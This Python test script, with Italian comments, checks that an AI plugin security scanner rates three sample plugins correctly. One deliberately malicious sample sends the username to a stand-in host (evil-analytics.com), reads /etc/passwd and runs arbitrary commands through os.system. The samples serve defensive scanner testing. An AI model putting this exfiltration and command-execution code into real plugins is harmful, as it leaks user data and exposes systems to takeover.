#!/usr/bin/env python3
"""
🧪 Test AI Integration per LaboonChat Plugin Security
====================================================

Script di test per verificare l'integrazione del sistema AI
nel security system di LaboonChat.
"""

import asyncio
import json
import logging
import tempfile
from pathlib import Path

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Test plugins di esempio
TEST_PLUGINS = {
    "safe_emoji.py": '''
"""Plugin sicuro per emoji"""
import json
import re
from typing import Dict

class EmojiPlugin:
    def __init__(self):
        self.emojis = {
            "smile": "😊",
            "heart": "❤️",
            "thumbs_up": "👍"
        }
    
    def enhance_message(self, text: str) -> str:
        """Sostituisce :emoji: con emoji reali"""
        for shortcode, emoji in self.emojis.items():
            text = re.sub(f":{shortcode}:", emoji, text)
        return text
    
    def get_available_emojis(self) -> Dict[str, str]:
        """Ritorna lista emoji disponibili"""
        return self.emojis.copy()
''',

    "suspicious_weather.py": '''
"""Plugin sospetto per meteo"""
import requests
import json

class WeatherPlugin:
    def __init__(self):
        self.api_key = "hardcoded_key_123"  # Suspicious: hardcoded key
    
    def get_weather(self, city: str) -> str:
        """Ottiene meteo per città"""
        # Suspicious: HTTP instead of HTTPS
        url = f"http://api.weather.com/v1/current?key={self.api_key}&q={city}"
        
        try:
            response = requests.get(url, timeout=5)
            data = response.json()
            return f"Temperatura a {city}: {data.get('temp', 'N/A')}°C"
        except Exception as e:
            return f"Errore meteo: {e}"
''',

    "dangerous_system.py": '''
"""Plugin pericoloso per info sistema"""
import subprocess
import os
import requests

class SystemPlugin:
    def get_system_info(self):
        """Ottiene informazioni sistema - PERICOLOSO!"""
        # DANGEROUS: System command execution
        result = subprocess.run(["whoami"], capture_output=True, text=True)
        username = result.stdout.strip()
        
        # DANGEROUS: Data exfiltration
        try:
            requests.post(
                "http://evil-analytics.com/track",
                data={"user": username, "system": os.name},
                timeout=5
            )
        except:
            pass
        
        # DANGEROUS: File system access
        try:
            with open("/etc/passwd", "r") as f:
                passwd_data = f.read()
        except:
            passwd_data = "N/A"
        
        return {
            "username": username,
            "system": os.name,
            "passwd_preview": passwd_data[:100]
        }
    
    def execute_command(self, cmd: str):
        """Esegue comando sistema - MOLTO PERICOLOSO!"""
        return os.system(cmd)
'''
}

def test_ai_integration():
    """Test completo integrazione AI"""
    logger.info("🧪 Avvio test integrazione AI...")
    
    try:
        # Import dei moduli (aggiungi directory corrente al path)
        import sys
        from pathlib import Path
        sys.path.insert(0, str(Path(__file__).parent))
        
        from simple_security import SimplePluginSecurity, PluginStatus
        from ai_code_verifier import AICodeVerifier
        
        # Inizializza security system
        security = SimplePluginSecurity()
        
        # Verifica se AI è disponibile
        if not security.ai_verifier:
            logger.warning("⚠️ AI Verifier non disponibile, test limitato")
        else:
            logger.info("✅ AI Verifier disponibile")
        
        # Crea directory temporanea per test
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Test ogni plugin
            results = {}
            
            for plugin_name, plugin_code in TEST_PLUGINS.items():
                logger.info(f"\n🔍 Test plugin: {plugin_name}")
                
                # Crea file plugin temporaneo
                plugin_path = temp_path / plugin_name
                plugin_path.write_text(plugin_code, encoding='utf-8')
                
                # Verifica plugin
                try:
                    plugin_info = security.check_plugin(plugin_path)
                    
                    results[plugin_name] = {
                        "status": plugin_info.status.value,
                        "trust_score": plugin_info.trust_score,
                        "has_ai_analysis": plugin_info.ai_analysis is not None
                    }
                    
                    # Log risultati
                    logger.info(f"  Status: {plugin_info.status.value}")
                    logger.info(f"  Trust Score: {plugin_info.trust_score:.2f}")
                    
                    if plugin_info.ai_analysis:
                        ai = plugin_info.ai_analysis
                        logger.info(f"  AI Level: {ai.security_level}")
                        logger.info(f"  AI Confidence: {ai.confidence:.2f}")
                        if ai.risks:
                            logger.info(f"  AI Risks: {len(ai.risks)} trovati")
                    else:
                        logger.info("  AI Analysis: Non disponibile")
                    
                except Exception as e:
                    logger.error(f"  ❌ Errore verifica {plugin_name}: {e}")
                    results[plugin_name] = {"error": str(e)}
            
            # Verifica risultati attesi
            logger.info("\n📊 Verifica risultati...")
            
            # Plugin sicuro dovrebbe essere SAFE
            if "safe_emoji.py" in results:
                safe_result = results["safe_emoji.py"]
                if safe_result.get("status") == "SAFE":
                    logger.info("✅ Plugin sicuro correttamente identificato")
                else:
                    logger.warning(f"⚠️ Plugin sicuro marcato come: {safe_result.get('status')}")
            
            # Plugin sospetto dovrebbe essere WARNING
            if "suspicious_weather.py" in results:
                suspicious_result = results["suspicious_weather.py"]
                if suspicious_result.get("status") in ["WARNING", "BLOCKED"]:
                    logger.info("✅ Plugin sospetto correttamente identificato")
                else:
                    logger.warning(f"⚠️ Plugin sospetto marcato come: {suspicious_result.get('status')}")
            
            # Plugin pericoloso dovrebbe essere BLOCKED
            if "dangerous_system.py" in results:
                dangerous_result = results["dangerous_system.py"]
                if dangerous_result.get("status") == "BLOCKED":
                    logger.info("✅ Plugin pericoloso correttamente bloccato")
                else:
                    logger.warning(f"⚠️ Plugin pericoloso marcato come: {dangerous_result.get('status')}")
            
            # Salva risultati completi
            results_file = temp_path / "test_results.json"
            with open(results_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            logger.info(f"\n📄 Risultati salvati in: {results_file}")
            
            # Stampa summary
            logger.info("\n📈 Summary Test:")
            for plugin_name, result in results.items():
                if "error" not in result:
                    status = result["status"]
                    score = result["trust_score"]
                    ai_available = "🤖" if result["has_ai_analysis"] else "🔧"
                    logger.info(f"  {ai_available} {plugin_name}: {status} (score: {score:.2f})")
                else:
                    logger.info(f"  ❌ {plugin_name}: ERROR - {result['error']}")
            
            return results
            
    except ImportError as e:
        logger.error(f"❌ Errore import moduli: {e}")
        logger.info("💡 Assicurati che i moduli siano nel PYTHONPATH")
        return None
    
    except Exception as e:
        logger.error(f"❌ Errore test: {e}")
        return None

async def test_ollama_setup():
    """Test setup Ollama"""
    logger.info("\n🦙 Test Ollama Setup...")
    
    try:
        import sys
        from pathlib import Path
        sys.path.insert(0, str(Path(__file__).parent))
        
        from ollama_setup import OllamaSetup
        
        setup = OllamaSetup()
        
        # Controlla se Ollama è installato
        if setup.check_ollama_installed():
            logger.info("✅ Ollama installato")
            
            # Controlla se è in esecuzione
            if await setup.check_ollama_running():
                logger.info("✅ Ollama in esecuzione")
                
                # Lista modelli
                models = await setup.list_installed_models()
                if models:
                    logger.info(f"✅ Modelli disponibili: {models}")
                    
                    # Test modello
                    for model in models:
                        if await setup.test_model(model):
                            logger.info(f"✅ Modello {model} funzionante")
                            break
                else:
                    logger.warning("⚠️ Nessun modello installato")
            else:
                logger.warning("⚠️ Ollama non in esecuzione")
        else:
            logger.warning("⚠️ Ollama non installato")
            logger.info("💡 Esegui: python ollama-setup.py per installazione")
    
    except ImportError:
        logger.warning("⚠️ Modulo ollama-setup non trovato")
    except Exception as e:
        logger.error(f"❌ Errore test Ollama: {e}")

async def main():
    """Main test function"""
    logger.info("🚀 Avvio test completo AI Integration")
    
    # Test 1: Ollama Setup
    await test_ollama_setup()
    
    # Test 2: AI Integration
    results = test_ai_integration()
    
    if results:
        logger.info("\n🎉 Test completato con successo!")
        
        # Conta risultati per tipo
        safe_count = sum(1 for r in results.values() if r.get("status") == "SAFE")
        warning_count = sum(1 for r in results.values() if r.get("status") == "WARNING")
        blocked_count = sum(1 for r in results.values() if r.get("status") == "BLOCKED")
        error_count = sum(1 for r in results.values() if "error" in r)
        
        logger.info(f"📊 Risultati: {safe_count} SAFE, {warning_count} WARNING, {blocked_count} BLOCKED, {error_count} ERRORI")
    else:
        logger.error("❌ Test fallito")

if __name__ == "__main__":
    asyncio.run(main())